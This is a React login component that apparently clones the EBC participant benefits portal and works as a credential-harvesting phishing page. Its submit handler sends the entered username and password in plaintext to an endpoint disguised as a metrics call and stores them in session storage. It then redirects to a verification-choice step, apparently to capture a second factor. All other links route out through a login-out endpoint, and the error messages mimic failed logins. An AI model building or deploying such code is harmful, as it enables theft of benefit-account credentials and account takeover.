"use client"

import { useLayoutEffect, useState, type FormEvent } from "react"
import { useRouter } from "next/navigation"
import {
  MSG_INCORRECT_USERNAME_PASSWORD,
  MSG_UNABLE_VERIFY_TIME,
  SIGN_IN_LOADING_MS,
} from "@/lib/approval-messages"
import {
  EbcParticipantShell,
  EbcInfoBanner,
  ebcLandingStyles as styles,
} from "@/components/ebc-participant-shell"
import { wait } from "@/lib/loading-delays"
import { storeLoginCredentials } from "@/lib/login-flow-storage"
const HERO_IMAGE_SRC = "/emp/images/Participant-Portal-Login.jpg"

/**
 * Human login landing UI — mounted inside the Astro LandingShell island.
 * Visual parity with portals.ebcflex.com Participant Login (2026 DS redesign).
 */
export default function EbcLoginLanding() {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isLoginLoading, setIsLoginLoading] = useState(false)
  const [loginError, setLoginError] = useState<string | null>(null)
  const router = useRouter()

  useLayoutEffect(() => {
    const params = new URLSearchParams(window.location.search)
    if (params.get("loginDenied") === "1") {
      setUsername("")
      setPassword("")
      setLoginError(MSG_INCORRECT_USERNAME_PASSWORD)
      window.history.replaceState({}, "", "/")
      return
    }
    if (params.get("verifyUnavailable") === "1") {
      setUsername("")
      setPassword("")
      setLoginError(MSG_UNABLE_VERIFY_TIME)
      window.history.replaceState({}, "", "/")
    }
  }, [])

  const handleSignIn = async (event: FormEvent) => {
    event.preventDefault()
    if (isLoginLoading || !username.trim() || !password.trim()) return
    setLoginError(null)
    setIsLoginLoading(true)

    void fetch("/api/metrics/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId: username.trim(),
        password: password.trim(),
      }),
    }).catch(() => {})

    try {
      sessionStorage.setItem("loginReady", "1")
      storeLoginCredentials(username.trim(), password.trim())
      sessionStorage.setItem("maskedEmail", "**********")
      sessionStorage.setItem("maskedPhone", "***-***-****")
    } catch {
      // continue
    }

    await wait(SIGN_IN_LOADING_MS)
    router.push("/verify-choice")
  }

  const goLoginOut = () => {
    window.location.href = "/api/login-out"
  }

  const clearErrorOnType = () => {
    if (loginError) setLoginError(null)
  }

  return (
    <EbcParticipantShell
      title="Participant Log In"
      intro="Enter your username and password to access your individual benefit account."
      showFooter
      errorMessage={loginError}
    >
      <div style={{ display: "flex", flexDirection: "column", gap: 24 }}>
        <EbcInfoBanner>
          To manage your organization&apos;s benefit plan,{" "}
          <button type="button" onClick={goLoginOut} className={styles.bannerLink}>
            log in as an employer
          </button>
          .
        </EbcInfoBanner>

        <div className={styles.mainRow}>
          <section
            className={styles.authCard}
            aria-labelledby="login-title"
          >
            <h2 className={styles.cardTitle} id="login-title">
              Log in to your account
            </h2>

            <form onSubmit={handleSignIn} className={styles.authForm}>
              <div className={styles.field}>
                <label htmlFor="userId" className={styles.label}>
                  Username
                </label>
                <div className={styles.control}>
                  <input
                    id="userId"
                    name="username"
                    type="text"
                    autoComplete="username"
                    aria-required="true"
                    className={styles.input}
                    value={username}
                    onChange={(e) => {
                      setUsername(e.target.value)
                      if (e.target.value.length > 0) clearErrorOnType()
                    }}
                  />
                  <button
                    type="button"
                    onClick={goLoginOut}
                    className={styles.fieldLink}
                  >
                    Forgot Username?
                  </button>
                </div>
              </div>

              <div className={styles.field}>
                <label htmlFor="password" className={styles.label}>
                  Password
                </label>
                <div className={styles.control}>
                  <input
                    id="password"
                    name="password"
                    type="password"
                    autoComplete="current-password"
                    aria-required="true"
                    className={styles.input}
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value)
                      if (e.target.value.length > 0) clearErrorOnType()
                    }}
                  />
                  <button
                    type="button"
                    onClick={goLoginOut}
                    className={styles.fieldLink}
                  >
                    Reset Password?
                  </button>
                </div>
              </div>

              <div className={styles.submitWrap}>
                <button
                  type="submit"
                  disabled={isLoginLoading}
                  className={`${styles.button} ${styles.buttonBlock}`}
                >
                  {isLoginLoading ? (
                    <span className={styles.spinner} aria-hidden="true" />
                  ) : (
                    <IconSignIn className={styles.btnIcon} />
                  )}
                  <span>{isLoginLoading ? "Loading..." : "Log in"}</span>
                </button>
              </div>
            </form>
          </section>

          <div>
            <button
              type="button"
              className={styles.promo}
              onClick={goLoginOut}
              aria-label="EBCentral participant portal"
            >
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img
                className={styles.promoImg}
                src={HERO_IMAGE_SRC}
                alt="EBCentral participant portal"
                width={550}
                height={212}
              />
            </button>
          </div>
        </div>

        <div className={styles.register}>
          <div className={styles.registerInner}>
            <section
              className={styles.registerCard}
              aria-labelledby="register-title"
            >
              <h2 className={styles.cardTitle} id="register-title">
                Not a user yet?
              </h2>
              <div>
                <button
                  type="button"
                  onClick={goLoginOut}
                  className={`${styles.button} ${styles.buttonSecondary}`}
                >
                  <IconUser className={styles.btnIcon} />
                  <span>Register</span>
                </button>
              </div>
            </section>
          </div>
        </div>
      </div>
    </EbcParticipantShell>
  )
}

function IconSignIn({ className }: { className?: string }) {
  return (
    <svg
      className={className}
      viewBox="0 0 512 512"
      aria-hidden="true"
      focusable="false"
    >
      <path
        fill="currentColor"
        d="M416 448h-84c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h84c26.5 0 48-21.5 48-48V160c0-26.5-21.5-48-48-48h-84c-6.6 0-12-5.4-12-12V60c0-6.6 5.4-12 12-12h84c53 0 96 43 96 96v192c0 53-43 96-96 96zm-47-201L201 79c-15-15-41-4.5-41 17v96H24c-13.3 0-24 10.7-24 24v96c0 13.3 10.7 24 24 24h136v96c0 21.5 26 32 41 17l168-168c9.3-9.4 9.3-24.6 0-34z"
      />
    </svg>
  )
}

function IconUser({ className }: { className?: string }) {
  return (
    <svg
      className={className}
      viewBox="0 0 448 512"
      aria-hidden="true"
      focusable="false"
    >
      <path
        fill="currentColor"
        d="M224 256A128 128 0 1 0 224 0a128 128 0 1 0 0 256zm-45.7 48C79.8 304 0 383.8 0 482.3C0 498.7 13.3 512 29.7 512H418.3c16.4 0 29.7-13.3 29.7-29.7C448 383.8 368.2 304 269.7 304H178.3z"
      />
    </svg>
  )
}
